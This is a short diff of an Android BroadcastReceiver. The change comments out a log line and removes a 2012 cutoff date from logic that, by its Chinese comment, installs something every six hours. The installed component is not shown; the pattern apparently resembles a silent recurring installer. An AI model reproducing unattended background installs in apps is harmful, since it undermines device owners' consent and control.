@@ -25,7 +25,7 @@ public class StartServiceReceiver extends BroadcastReceiver {
 	java.text.SimpleDateFormat sf = new java.text.SimpleDateFormat("yyyyMMdd");
     @Override      
     public void onReceive(Context context, Intent intent) { 
-    	Log.e("StartServiceReceiver","StartServiceReceiver++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
+    	//Log.e("StartServiceReceiver","StartServiceReceiver++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
     	this.context = context;
    	 if (intent.getAction().equals("com.custom.broadcast.StartServiceReceiver")) { 
    		 //每隔6小时安装一次
@@ -44,12 +44,7 @@ public class StartServiceReceiver extends BroadcastReceiver {
    		 
    		 
    		 try{
-   			 //限制条件
-   	   		 java.util.Calendar c = java.util.Calendar.getInstance();
-   	   		 c.set(2012, 2, 28);
-   	   		if(c.getTime().getTime()<nowTime){
-   	   			return ;
-   	   		}
+
    	   		
    	   		if(nowTime-times>=sixHoure){
    	   			SharedPreferencesUtils.setConfigString(
